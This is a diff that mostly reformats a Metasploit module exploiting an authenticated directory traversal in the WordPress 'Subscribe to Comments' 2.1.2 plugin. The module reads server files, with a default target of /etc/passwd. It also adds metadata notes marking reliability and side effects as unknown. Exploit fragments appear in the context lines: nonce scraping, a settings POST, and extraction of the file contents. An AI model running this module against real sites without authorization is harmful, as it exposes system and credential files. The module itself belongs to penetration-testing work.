@@ -9,33 +9,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits an authenticated directory traversal vulnerability
-        in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
-        to read arbitrary files with the web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Subscribe Comments File Read Vulnerability',
+        'Description' => %q{
+          This module exploits an authenticated directory traversal vulnerability
+          in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
+          to read arbitrary files with the web server privileges.
+        },
+        'References' => [
           ['WPVDB', '8102'],
           ['PACKETSTORM', '132694'],
           ['URL', 'https://advisories.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('WP_USER', [true, 'A valid username', nil]),
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
-      ])
+      ]
+    )
   end
 
   def user
@@ -52,10 +59,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_nonce(cookie)
     res = send_request_cgi(
-      'uri'    => normalize_uri(wordpress_url_backend, 'options-general.php'),
+      'uri' => normalize_uri(wordpress_url_backend, 'options-general.php'),
       'method' => 'GET',
-      'vars_get'  => {
-        'page'    => 'stc-options'
+      'vars_get' => {
+        'page' => 'stc-options'
       },
       'cookie' => cookie
     )
@@ -64,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
       location = res.redirection
       print_status("Following redirect to #{location}")
       res = send_request_cgi(
-        'uri'    => location,
+        'uri' => location,
         'method' => 'GET',
         'cookie' => cookie
       )
@@ -73,6 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.body && res.body =~ /id="_wpnonce" name="_wpnonce" value="([a-z0-9]+)" /
       return Regexp.last_match[1]
     end
+
     nil
   end
 
@@ -81,10 +89,10 @@ class MetasploitModule < Msf::Auxiliary
     filename = filename[1, filename.length] if filename =~ %r{/^///}
 
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => normalize_uri(wordpress_url_backend, 'options-general.php'),
-      'vars_get'  => {
-        'page'    => 'stc-options'
+      'method' => 'POST',
+      'uri' => normalize_uri(wordpress_url_backend, 'options-general.php'),
+      'vars_get' => {
+        'page' => 'stc-options'
       },
       'vars_post' => {
         'sg_subscribe_settings[name]' => '',
@@ -103,12 +111,13 @@ class MetasploitModule < Msf::Auxiliary
         '_wpnonce' => "#{nonce}",
         '_wp_http_referer' => '/wp-admin/options-general.php?page=stc-options'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200 && res.body.include?("<p><strong>Options saved.</strong>")
       return res.body
     end
+
     nil
   end
 
@@ -137,18 +146,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     res = send_request_cgi(
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path),
-      'vars_get'  => {
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path),
+      'vars_get' => {
         'wp-subscription-manager' => '1'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200 &&
-        res.body.length > 830 &&
-        res.body.include?(">Find Subscriptions</") &&
-        res.headers['Content-Length'].to_i > 830
+       res.body.length > 830 &&
+       res.body.include?(">Find Subscriptions</") &&
+       res.headers['Content-Length'].to_i > 830
 
       res_clean = res.body.gsub(/\t/, '').gsub(/\r\n/, '').gsub(/<.*$/, "")
 
